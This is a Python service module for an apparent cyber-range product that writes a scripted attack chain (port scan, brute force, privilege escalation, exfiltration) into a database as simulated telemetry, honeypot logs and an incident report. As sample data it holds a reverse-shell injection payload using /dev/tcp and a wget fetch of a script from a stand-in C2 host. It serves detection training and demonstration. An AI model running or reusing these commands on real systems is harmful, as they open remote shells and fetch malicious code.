"""
Flagship Attack Simulator Service for SanitialX Cyber Range.

Generates realistic, correlated telemetry events inside an isolated cyber range,
triggers honeypot interaction logs, creates incidents, builds attack graphs,
and generates AI reasoning reports.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone, timedelta
from typing import Any

from sqlalchemy.ext.asyncio import AsyncSession
from db.repositories.event_repository import PostgresEventRepository
from db.repositories.agent_repository import PostgresAgentRepository
from db.repositories.honeypot_repository import PostgresHoneypotRepository
from db.repositories.simulation_repository import PostgresSimulationRepository
from db.repositories.incident_repository import PostgresIncidentRepository
from incidents.models import Incident
from incidents.enums import IncidentStatus


class AttackSimulatorService:
    def __init__(self, session: AsyncSession) -> None:
        self._session = session
        self.event_repo = PostgresEventRepository(session)
        self.agent_repo = PostgresAgentRepository(session)
        self.honeypot_repo = PostgresHoneypotRepository(session)
        self.simulation_repo = PostgresSimulationRepository(session)
        self.incident_repo = PostgresIncidentRepository(session)

    async def run_scenario(self, scenario_name: str = "WEB_APP_COMPROMISE") -> dict[str, Any]:
        """Execute a simulated attack scenario and generate end-to-end telemetry."""
        sim_id = f"SIM-{uuid.uuid4().hex[:8].upper()}"
        inc_id = f"INC-{datetime.now().year}-{uuid.uuid4().hex[:4].upper()}"
        attacker_ip = "10.0.0.21"
        target_web_ip = "10.0.0.50"
        target_db_ip = "10.0.0.88"
        c2_ip = "198.51.100.42"

        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=180 - i * 20) for i in range(10)]

        # 1. Generate Agents Telemetry
        await self.agent_repo.upsert_agent({
            "agent_id": "agent-web-01",
            "hostname": "web-prod-frontend-01",
            "ip_address": target_web_ip,
            "os": "Ubuntu 22.04 LTS (Linux)",
            "status": "COMPROMISED",
            "last_seen": now,
            "cpu_usage": 78.4,
            "memory_usage": 64.2,
            "risk_score": 92,
            "events_count": 142,
        })
        await self.agent_repo.upsert_agent({
            "agent_id": "agent-db-01",
            "hostname": "db-internal-cluster-01",
            "ip_address": target_db_ip,
            "os": "Debian 12 Bookworm (Linux)",
            "status": "WARNING",
            "last_seen": now,
            "cpu_usage": 42.1,
            "memory_usage": 55.0,
            "risk_score": 68,
            "events_count": 89,
        })
        await self.agent_repo.upsert_agent({
            "agent_id": "agent-honeypot-01",
            "hostname": "decoy-ssh-vault",
            "ip_address": "10.0.0.99",
            "os": "Alpine Linux (Deception Node)",
            "status": "ONLINE",
            "last_seen": now,
            "cpu_usage": 12.0,
            "memory_usage": 22.5,
            "risk_score": 85,
            "events_count": 34,
        })

        # 2. Generate Sequence of Security Events
        raw_events_data = [
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[0],
                "event_type": "RECONNAISSANCE_PORT_SCAN",
                "severity": "MEDIUM",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "anonymous",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-RCON-01",
                "mitre_technique": "T1046",
                "details": "Port scan detected targeting ports 80, 443, 22, 3306, 8080.",
                "raw_payload": {"ports_scanned": [80, 443, 22, 3306, 8080], "scanner": "nmap"},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[1],
                "event_type": "AUTH_FAILED_BRUTE_FORCE",
                "severity": "MEDIUM",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "admin",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-AUTH-01",
                "mitre_technique": "T1110.001",
                "details": "Multiple failed authentication attempts on HTTP POST /login (14 failures in 30s).",
                "raw_payload": {"failed_attempts": 14, "target_uri": "/api/v1/auth/login"},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[2],
                "event_type": "AUTH_SUCCESSFUL_COMPROMISE",
                "severity": "HIGH",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "sysadmin_backup",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-AUTH-02",
                "mitre_technique": "T1078.003",
                "details": "Successful login for user sysadmin_backup following brute force series.",
                "raw_payload": {"session_token": "bearer_temp_xyz123"},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[3],
                "event_type": "COMMAND_INJECTION_DETECTED",
                "severity": "CRITICAL",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "www-data",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-EXPLOIT-01",
                "mitre_technique": "T1059.004",
                "details": "Web shell / command injection parameter detected in HTTP POST request: ; /bin/bash -c ...",
                "raw_payload": {"payload": "; bash -i >& /dev/tcp/10.0.0.21/4444 0>&1"},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[4],
                "event_type": "SSH_SESSION_ESTABLISHED",
                "severity": "HIGH",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "sysadmin_backup",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-NET-01",
                "mitre_technique": "T1021.004",
                "details": "Interactive SSH session opened from attacker IP using stolen SSH key.",
                "raw_payload": {"ssh_key_fingerprint": "SHA256:7b92f..."},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[5],
                "event_type": "HONEYPOT_DECEIVE_INTERACTION",
                "severity": "CRITICAL",
                "source_ip": attacker_ip,
                "destination_ip": "10.0.0.99",
                "user": "root",
                "host": "decoy-ssh-vault",
                "rule_id": "RULE-DECEP-01",
                "mitre_technique": "T1087.002",
                "details": "Attacker interacted with SSH Honeypot Decoy service and downloaded fake credential file `/var/www/.env.honeypot`.",
                "raw_payload": {"honeypot_id": "SSH-VAULT-01", "decoy_file": "/var/www/.env.honeypot"},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[6],
                "event_type": "PRIVILEGE_ESCALATION_SUID",
                "severity": "CRITICAL",
                "source_ip": attacker_ip,
                "destination_ip": target_web_ip,
                "user": "root",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-PRIV-01",
                "mitre_technique": "T1548.001",
                "details": "Privilege escalation to root verified via SUID binary binary_helper exploitation.",
                "raw_payload": {"binary": "/usr/local/bin/binary_helper", "effective_uid": 0},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[7],
                "event_type": "DATABASE_SENSITIVE_READ",
                "severity": "CRITICAL",
                "source_ip": target_web_ip,
                "destination_ip": target_db_ip,
                "user": "db_master_admin",
                "host": "db-internal-cluster-01",
                "rule_id": "RULE-DATA-01",
                "mitre_technique": "T1005",
                "details": "SQL query executed reading customer_records table and downloading customer_db_dump.sql.",
                "raw_payload": {"tables": ["customer_records", "payment_vault"], "rows_returned": 24500},
            },
            {
                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
                "timestamp": timestamps[8],
                "event_type": "OUTBOUND_EXFILTRATION_DETECTED",
                "severity": "CRITICAL",
                "source_ip": target_web_ip,
                "destination_ip": c2_ip,
                "user": "root",
                "host": "web-prod-frontend-01",
                "rule_id": "RULE-EXFIL-01",
                "mitre_technique": "T1041",
                "details": "Simulated encrypted outbound data transfer (48.2 MB) sent to known C2 server IP.",
                "raw_payload": {"bytes_sent": 50541280, "c2_ip": c2_ip, "port": 8443},
            },
        ]

        for evt in raw_events_data:
            await self.event_repo.add_event(evt)

        # 3. Create Honeypot Session
        await self.honeypot_repo.add_session({
            "session_id": f"HONEY-{uuid.uuid4().hex[:6]}",
            "attacker_ip": attacker_ip,
            "service": "SSH Honeypot & Fake Vault",
            "started_at": timestamps[5],
            "ended_at": timestamps[8],
            "duration_seconds": 134,
            "credentials_attempted": ["admin", "root", "sysadmin_backup", "postgres"],
            "commands_executed": ["whoami", "uname -a", "cat /var/www/.env.honeypot", "wget http://c2.server/mal.sh"],
            "files_accessed": ["/var/www/.env.honeypot", "/root/decoy_keys.pem"],
            "risk_score": 95,
            "notes": "Attacker trapped in Alpine isolation honeypot container. High-value deception metrics gathered.",
        })

        # 4. Construct Attack Graph Nodes & AI Investigation Data
        attack_graph_nodes = [
            {"id": "node-1", "label": "Attacker (10.0.0.21)", "type": "attacker", "status": "active", "timestamp": timestamps[0].isoformat(), "details": "Scanned target ports & initiated brute force"},
            {"id": "node-2", "label": "Web App (10.0.0.50)", "type": "asset", "status": "compromised", "timestamp": timestamps[2].isoformat(), "details": "Authentication bypassed via credential reuse"},
            {"id": "node-3", "label": "SSH Service", "type": "service", "status": "compromised", "timestamp": timestamps[4].isoformat(), "details": "Interactive shell opened"},
            {"id": "node-4", "label": "Honeypot Decoy (10.0.0.99)", "type": "deception", "status": "triggered", "timestamp": timestamps[5].isoformat(), "details": "Downloaded decoy secrets file"},
            {"id": "node-5", "label": "Root Escalation", "type": "exploit", "status": "escalated", "timestamp": timestamps[6].isoformat(), "details": "Exploited SUID helper binary"},
            {"id": "node-6", "label": "Fake Database (10.0.0.88)", "type": "asset", "status": "accessed", "timestamp": timestamps[7].isoformat(), "details": "Extracted 24,500 customer records"},
            {"id": "node-7", "label": "External C2 (198.51.100.42)", "type": "exfiltration", "status": "exfiltrated", "timestamp": timestamps[8].isoformat(), "details": "Simulated 48.2 MB transfer"},
        ]

        attack_graph_edges = [
            {"source": "node-1", "target": "node-2", "label": "T1110 Brute Force"},
            {"source": "node-2", "target": "node-3", "label": "T1021 SSH Shell"},
            {"source": "node-3", "target": "node-4", "label": "T1087 Honeypot Access"},
            {"source": "node-3", "target": "node-5", "label": "T1548 SUID Escalation"},
            {"source": "node-5", "target": "node-6", "label": "T1005 DB Access"},
            {"source": "node-6", "target": "node-7", "label": "T1041 Exfiltration"},
        ]

        ai_reasoning = {
            "executive_summary": "SanitialX correlation engine detected a full-chain cyber attack targeting the production Web Application. The attacker gained initial access via automated credential brute-forcing, escalated privileges to root, interacted with deception honeypots, and attempted exfiltration of 24,500 simulated customer records.",
            "initial_access_vector": "T1110.001 - Brute Force attack originating from external IP 10.0.0.21 against HTTP /login.",
            "affected_assets": ["web-prod-frontend-01 (10.0.0.50)", "db-internal-cluster-01 (10.0.0.88)", "decoy-ssh-vault (10.0.0.99)"],
            "observed_techniques": ["T1046 (Network Service Scanning)", "T1110 (Brute Force)", "T1078 (Valid Accounts)", "T1059 (Command Injection)", "T1021 (SSH Remote Services)", "T1087 (Honeypot Account Discovery)", "T1548 (SUID Privilege Escalation)", "T1005 (Data from Local System)", "T1041 (Exfiltration Over C2)"],
            "honeypot_engagement": "Attacker successfully trapped in SSH Deception Node (10.0.0.99) for 134 seconds, revealing C2 IP 198.51.100.42 and credential harvest vectors.",
            "simulated_data_loss": "24,500 customer records in simulated database table customer_records.",
            "overall_risk_score": 96,
            "recommended_actions": [
                "1. Immediately block malicious source IP 10.0.0.21 and C2 IP 198.51.100.42 on perimeter firewall.",
                "2. Revoke and rotate SSH keys and credentials for user sysadmin_backup.",
                "3. Isolate host web-prod-frontend-01 for forensic image capture.",
                "4. Patch SUID binary /usr/local/bin/binary_helper permission vulnerability.",
                "5. Enable multi-factor authentication (MFA) on all SOC administrative web portals.",
            ],
            "graph_nodes": attack_graph_nodes,
            "graph_edges": attack_graph_edges,
        }

        # 5. Create or Update Incident
        incident_obj = Incident(
            incident_id=inc_id,
            title="Web Application Compromise & Data Exfiltration",
            description="Full-chain attack simulation: Recon -> Brute Force -> Shell -> Honeypot -> Priv Esc -> Data Access -> Exfiltration",
            severity="CRITICAL",
            status=IncidentStatus.OPEN,
            version=1,
            created_at=now,
            updated_at=now,
            source_ip=attacker_ip,
            destination_ip=target_web_ip,
            triggering_detection_ids=["RULE-EXPLOIT-01", "RULE-PRIV-01", "RULE-EXFIL-01"],
            context=ai_reasoning,
        )

        created_inc = await self.incident_repo.create(incident_obj)

        # 6. Save Simulation Record
        sim_model = await self.simulation_repo.add_simulation({
            "simulation_id": sim_id,
            "scenario_name": scenario_name,
            "target_environment": "SanitialX Cyber Range",
            "difficulty": "Intermediate",
            "status": "COMPLETED",
            "started_at": timestamps[0],
            "completed_at": now,
            "generated_incident_id": created_inc.incident_id,
            "events_generated": len(raw_events_data),
            "details": {
                "attacker_ip": attacker_ip,
                "victim_ip": target_web_ip,
                "honeypot_triggered": True,
                "incident_created": created_inc.incident_id,
            },
        })

        return sim_model.to_dict()
